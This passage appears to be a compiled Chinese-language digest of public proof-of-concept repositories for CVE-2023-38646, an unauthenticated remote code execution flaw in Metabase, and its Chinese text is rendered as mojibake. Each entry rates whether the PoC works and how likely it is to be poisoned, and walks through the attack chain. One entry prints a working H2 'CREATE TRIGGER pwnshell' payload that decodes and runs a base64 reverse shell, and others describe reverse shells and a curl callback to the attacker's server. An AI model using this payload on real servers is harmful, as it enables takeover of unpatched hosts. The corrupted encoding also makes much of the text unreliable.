4.  Metabase å°è¯•è¿æ¥æ¶æ„æ•°æ®åº“ï¼Œä»è€Œè§¦å‘æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…·ä½“æ˜¯é€šè¿‡åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ï¼Œè¿™æ®µä»£ç ä¼šè°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
5.  POCä»£ç ä¸­ï¼Œåˆ©ç”¨ `bash -c` å’Œ `base64` å‘½ä»¤ç»„åˆï¼Œæ‰§è¡Œ base64 ç¼–ç åçš„åå¼¹ shell å‘½ä»¤ï¼Œå®ç°åå¼¹ shellã€‚

**é¡¹ç›®åœ°å€:** [alexandre-pecorilla/CVE-2023-38646](https://github.com/alexandre-pecorilla/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #18

**æ¥æº**: [CVE-2023-38646-asepsaepdin_CVE-2023-38646.md](../2023/CVE-2023-38646-asepsaepdin_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ) å’Œ < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬ä½äºå—å½±å“ç‰ˆæœ¬ï¼Œä¸”å¯ä»¥é€šè¿‡HTTP/HTTPSè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´åˆ©ç”¨ä»£ç `CVE-2023-38646-POC.py`å’Œ`CVE-2023-38646-Reverse-Shell.py`æä¾›äº†ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

1.  **æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
    *   **è·å–Setup Tokenï¼š** é¦–å…ˆï¼Œ`CVE-2023-38646-POC.py` è„šæœ¬é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹æ¥è·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚è¯¥Tokenåœ¨åˆå§‹åŒ–è®¾ç½®é˜¶æ®µä½¿ç”¨ï¼Œæ˜¯åç»­åˆ©ç”¨çš„å…³é”®ã€‚
    *   **Reverse Shellåˆ©ç”¨ï¼š** `CVE-2023-38646-Reverse-Shell.py` è„šæœ¬åˆ©ç”¨è·å–çš„Setup Tokenï¼Œé€šè¿‡å‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå¹¶æ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå°†Payloadæ³¨å…¥åˆ°æ•°æ®åº“é…ç½®ä¸­ã€‚è¯¥Payloadä¼šæ‰§è¡Œä¸€ä¸ªåå‘Shellå‘½ä»¤ï¼Œè¿æ¥åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

2.  **æœ‰æ•ˆæ€§ï¼š**
    æ ¹æ®æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­æ­¤POC**æœ‰æ•ˆ**ã€‚å¤šä¸ªæ¥æºè¯å®äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œå¯åˆ©ç”¨æ€§ï¼Œå¹¶ä¸”æä¾›äº†å¯æ“ä½œçš„POCã€‚

3.  **æŠ•æ¯’é£é™©ï¼š**
    ä»£ç ä¸­å‘ç°çš„æ½œåœ¨æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦åˆ†æå¦‚ä¸‹ï¼š
    *   `CVE-2023-38646-POC.py` ä¸»è¦ç”¨äºè·å–Setup Tokenï¼ŒåŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºã€‚
    *   `CVE-2023-38646-Reverse-Shell.py` çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨Setup Tokenæ‰§è¡ŒRCEï¼Œä½†æ˜¯æ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå‘è¿æ¥çš„IPå’Œç«¯å£ï¼Œå› æ­¤ä»£ç æœ¬èº«åªæ˜¯æä¾›äº†ä¸€ä¸ªæ¡†æ¶ã€‚é£é™©ç‚¹åœ¨äºå¦‚æœæ”»å‡»è€…ä¸å°å¿ƒä½¿ç”¨äº†é”™è¯¯çš„payloadï¼Œå¯èƒ½å¯¼è‡´ç›®æ ‡ç³»ç»Ÿå´©æºƒæˆ–å…¶ä»–å¼‚å¸¸ã€‚

   æ€»ä½“æ¥è¯´ï¼Œé£é™©ä¸»è¦é›†ä¸­åœ¨payloadçš„æ„å»ºå’Œæ‰§è¡Œä¸Šï¼Œè€Œéä»£ç æœ¬èº«å­˜åœ¨æ¶æ„æ³¨å…¥ã€‚ä½†ä¾æ—§éœ€è¦å¯¹ä¸‹è½½çš„è„šæœ¬è¿›è¡Œå…¨é¢çš„ä»£ç å®¡è®¡ã€‚


**é¡¹ç›®åœ°å€:** [asepsaepdin/CVE-2023-38646](https://github.com/asepsaepdin/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #19

**æ¥æº**: [CVE-2023-38646-birdm4nw_CVE-2023-38646.md](../2023/CVE-2023-38646-birdm4nw_CVE-2023-38646.md)

## CVE-2023-38646 - Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ), å…¶ä»–å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2.

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **è·å–setup-token:**  æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæå– `setup-token`ã€‚
2.  **æ„é€ æ¶æ„payload:**  æ„é€ åŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT` å‚æ•°å’Œ `CREATE TRIGGER` è¯­å¥ï¼Œåœ¨H2æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨æ¯æ¬¡ä» `INFORMATION_SCHEMA.TABLES` è¡¨ä¸­é€‰æ‹©æ•°æ®ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä¸­åŒ…å«çš„ Javascript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
3.  **å‘é€payload:**  å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  **æ‰§è¡Œå‘½ä»¤:**  Metabase å°è¯•ä½¿ç”¨æä¾›çš„æ•°æ®åº“è¿æ¥ï¼Œè§¦å‘æ¶æ„çš„ H2 è§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

è¯¥æ¼æ´åˆ©ç”¨ä»£ç é¦–å…ˆè·å–Metabaseçš„`setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªæ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œé€šè¿‡`TRACE_LEVEL_SYSTEM_OUT`å’Œ`CREATE TRIGGER`æœºåˆ¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç æ¥ç»•è¿‡ä¸€äº›è¿‡æ»¤ï¼Œå¹¶åœ¨payloadä¸­éšæœºç”Ÿæˆå­—ç¬¦ä¸²æ¥é¿å…ç¼“å­˜ç­‰é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¹¶æ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ä»£ç çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´è¿›è¡Œåå¼¹shellï¼Œè™½ç„¶åå¼¹shellæœ¬èº«å…·æœ‰ä¸€å®šçš„é£é™©ï¼Œä½†è¿™æ˜¯æ¼æ´åˆ©ç”¨çš„æ­£å¸¸è¡Œä¸ºï¼Œä¸åº”è§†ä¸ºæŠ•æ¯’ã€‚`README.md`æ–‡ä»¶ä¹Ÿæ²¡æœ‰ä»»ä½•å¯ç–‘ä¹‹å¤„ã€‚å¯ä»¥åˆ¤æ–­æ­¤ä»“åº“ä¸­ä½œè€…éšè—æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§å¾ˆä½ï¼Œæ¦‚ç‡ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [birdm4nw/CVE-2023-38646](https://github.com/birdm4nw/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #20

**æ¥æº**: [CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md](../2023/CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»æˆæƒçš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå­˜åœ¨æ¼æ´çš„Metabaseç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ¼æ´å­˜åœ¨äº Metabase çš„è®¾ç½®æµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒé€šè¿‡ä»¥ä¸‹æ­¥éª¤åˆ©ç”¨æ¼æ´ï¼š
1.  è·å– setup-token, ç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  æ„é€ åŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ POST è¯·æ±‚ï¼Œå‘é€åˆ° /api/setup/validate æ¥å£ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª SQL è§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® INFORMATION_SCHEMA.TABLES æ—¶æ‰§è¡Œä»»æ„çš„ base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  æ‰§è¡Œçš„å‘½ä»¤æ˜¯åå¼¹shellï¼Œå°†ç›®æ ‡æœåŠ¡å™¨çš„ shell é‡å®šå‘åˆ°æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©ï¼š**
ä»“åº“ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚ä¸»è¦é£é™©æ¥è‡ªäºï¼š
1.  `add_padding`å‡½æ•°ï¼šè¿™ä¸ªå‡½æ•°çœ‹ä¼¼æ˜¯ä¸ºäº†æ¶ˆé™¤ base64 ç¼–ç åçš„ç­‰å·ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æ­¤å‡½æ•°æ¥æ’å…¥æ¶æ„ä»£ç ï¼Œè™½ç„¶å½“å‰çš„ç›®çš„æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›è¿‡æ»¤æœºåˆ¶ï¼Œä½†å­˜åœ¨è¢«æ»¥ç”¨çš„é£é™©ï¼Œé€šè¿‡ä¿®æ”¹payloadæ„é€ è¿‡ç¨‹æ¤å…¥æ¶æ„ä»£ç ã€‚
2.  åå¼¹ Shell çš„IPå’Œç«¯å£æ˜¯ç”¨æˆ·æŒ‡å®šçš„ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…æ— æ³•é€šè¿‡ç›´æ¥ä¿®æ”¹ä»£ç æ¥æ¤å…¥åé—¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æ¼æ´å®šä½ï¼š** æ¼æ´å­˜åœ¨äºMetabaseçš„å®‰è£…è®¾ç½®é˜¶æ®µï¼Œå…·ä½“ä½äº`api/setup/validate`æ¥å£ã€‚
2.  **è·å–Tokenï¼š** é€šè¿‡è®¿é—®`/api/session/properties`è·å–`setup-token`ï¼Œè¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚
3.  **æ„é€ Payloadï¼š**  æ ¸å¿ƒåœ¨äºæ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä»¥ä¸‹å…³é”®éƒ¨åˆ†ï¼š
    *   `zip:/app/metabase.jar!/sample-database.db`ï¼šæŒ‡å®šæ•°æ®åº“æ–‡ä»¶çš„ä½ç½®ã€‚
    *   `MODE=MSSQLServer`ï¼šè®¾ç½®æ•°æ®åº“æ¨¡å¼ä¸ºMSSQLServerï¼Œè¿™æ˜¯è§¦å‘æ¼æ´çš„å¿…è¦æ¡ä»¶ã€‚
    *   `TRACE_LEVEL_SYSTEM_OUT=1`ï¼šå¯ç”¨ç³»ç»Ÿè¾“å‡ºè·Ÿè¸ªã€‚
    *   `CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x`ï¼šåˆ›å»ºä¸€ä¸ªåä¸º`pwnshell`çš„è§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢`INFORMATION_SCHEMA.TABLES`è¡¨ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä½¿ç”¨ JavaScript è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œåå¼¹shellå‘½ä»¤ã€‚`{payload}`ä¼šè¢«æ›¿æ¢ä¸ºbase64ç¼–ç åçš„åå¼¹shellå‘½ä»¤ï¼Œå…¶ä¸­åˆ©ç”¨äº†bashçš„ç‰¹æ€§è¿›è¡Œè§£ç å’Œæ‰§è¡Œã€‚
4.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ å¥½çš„åŒ…å«payloadçš„JSONæ•°æ®ï¼Œé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`æ¥å£ã€‚
5.  **æ‰§è¡Œå‘½ä»¤ï¼š**  å½“Metabaseå°è¯•è¿æ¥åˆ°æ¶æ„æ„é€ çš„æ•°æ®åº“æ—¶ï¼Œè§¦å‘å™¨è¢«æ‰§è¡Œï¼Œä»è€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [j0yb0y0h/CVE-2023-38646](https://github.com/j0yb0y0h/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #21

**æ¥æº**: [CVE-2023-38646-junnythemarksman_CVE-2023-38646.md](../2023/CVE-2023-38646-junnythemarksman_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­å­˜åœ¨çš„ä¸€ä¸ªæ— éœ€è®¤è¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡å‘é€ç‰¹åˆ¶çš„ POST è¯·æ±‚åˆ° `/api/setup/validate` æ¥å£ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨ `subname` å­—æ®µä¸­æ³¨å…¥æ¶æ„çš„ JDBC URLã€‚è¯¥URLåŒ…å«ä¸€ä¸ªCREATE TRIGGERè¯­å¥ï¼Œè¯¥è¯­å¥åœ¨INFORMATION_SCHEMA.TABLESè¡¨ä¸Šåˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨æ‰§è¡Œä»»æ„ Java ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚åˆ©ç”¨æ–¹å¼æ˜¯é€šè¿‡æä¾›ä¸€ä¸ªåŒ…å«åå¼¹shellå‘½ä»¤çš„payloadï¼Œè¯¥å‘½ä»¤ä¼šè¢«base64ç¼–ç åæ‰§è¡Œã€‚æ¼æ´åˆ©ç”¨ä»£ç ä¸­çš„æŠ•æ¯’é£é™©è¾ƒä½ï¼Œä¸»è¦æ˜¯é€šè¿‡ç¯¡æ”¹IPå’Œç«¯å£è¿›è¡Œæ¶æ„è¿æ¥ï¼Œå­˜åœ¨å°‘é‡é£é™©ã€‚ è„šæœ¬è¦æ±‚ç”¨æˆ·æŒ‡å®šç›®æ ‡ URL å’Œ tokenï¼Œ token é€šè¿‡ `/api/session/properties` è·å–ã€‚

**æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**

1.  è·å–ç›®æ ‡ Metabase å®ä¾‹çš„ URL å’Œ tokenï¼ˆé€šè¿‡è®¿é—® `/api/session/properties` è·å–ï¼‰ã€‚
2.  é…ç½®æ¼æ´åˆ©ç”¨è„šæœ¬ `exploit.py`ï¼Œè®¾ç½®ç›®æ ‡ URLã€tokenã€æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚
3.  è¿è¡Œè„šæœ¬ï¼Œè„šæœ¬å°†å‘é€åŒ…å«æ¶æ„ JDBC URL çš„ POST è¯·æ±‚åˆ°ç›®æ ‡ Metabase å®ä¾‹ã€‚
4.  ç›®æ ‡ Metabase å®ä¾‹æ‰§è¡Œæ¶æ„ä»£ç ï¼Œåå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯æ„é€ å’Œå‘é€æ¶æ„è¯·æ±‚ï¼Œè™½ç„¶å­˜åœ¨é€šè¿‡ä¿®æ”¹IPç«¯å£è¿›è¡Œæ¶æ„è¿æ¥çš„é£é™©ï¼Œ ä½†æ˜¯éœ€è¦ä½¿ç”¨è€…è‡ªè¡Œé…ç½®ã€‚æ‰€ä»¥æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚

**é¡¹ç›®åœ°å€:** [junnythemarksman/CVE-2023-38646](https://github.com/junnythemarksman/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #22

**æ¥æº**: [CVE-2023-38646-kh4sh3i_CVE-2023-38646.md](../2023/CVE-2023-38646-kh4sh3i_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯è¢«ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseçš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå­˜åœ¨äº0.46.6.1ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ1.46.6.1ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ä¸­ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯ï¼Œé€šè¿‡å‘é€ç‰¹åˆ¶çš„HTTPè¯·æ±‚åˆ°/api/setup/validateç«¯ç‚¹ï¼Œå…¶ä¸­åŒ…å«æ¶æ„æ„é€ çš„JSON payloadã€‚è¯¥payloadåˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE ALIAS`è¯­å¥åˆ›å»ºä¸€ä¸ªåä¸º`SHELLEXEC`çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚PoCä»£ç é€šè¿‡curlå‘½ä»¤å›è¿æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ŒéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚è™½ç„¶POCä¸­ä½¿ç”¨äº†curlè¿›è¡Œå›è¿ï¼Œä½†æ”»å‡»è€…å¯ä»¥æ›¿æ¢æˆä»»ä½•å‘½ä»¤è¿›è¡Œæ¶æ„åˆ©ç”¨ã€‚æŠ•æ¯’é£é™©è¾ƒä½ï¼Œåªæœ‰æå°çš„å¯èƒ½æ€§ä½œè€…åœ¨ä»£ç ä¸­æ¤å…¥å…¶ä»–æ¶æ„ä»£ç ï¼ˆæ¯”å¦‚åœ¨LICENSEæ–‡ä»¶ä¸­éšè—ä¸å¯è§å­—ç¬¦ï¼‰ï¼Œä½†è¿™å¯ä»¥é€šè¿‡ä»”ç»†å®¡æŸ¥ä»£ç æ¥é¿å…ã€‚PoCä»£ç ä¸»è¦é€šè¿‡H2æ•°æ®åº“çš„ç‰¹æ€§æ‰§è¡Œä»»æ„ä»£ç ï¼ŒLICENSEæ–‡ä»¶ä¸»è¦å£°æ˜äº†ç‰ˆæƒåè®®ã€‚

**é¡¹ç›®åœ°å€:** [kh4sh3i/CVE-2023-38646](https://github.com/kh4sh3i/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #23

**æ¥æº**: [CVE-2023-38646-nickswink_CVE-2023-38646.md](../2023/CVE-2023-38646-nickswink_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç½‘ç»œå¯è¾¾

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´å½±å“ Metabase å¼€æºç‰ˆæœ¬ä½äº 0.46.6.1 å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ä½äº 1.46.6.1 çš„å®ä¾‹ã€‚å¤šä¸ªèµ„æºç¡®è®¤äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œä¸¥é‡æ€§ã€‚

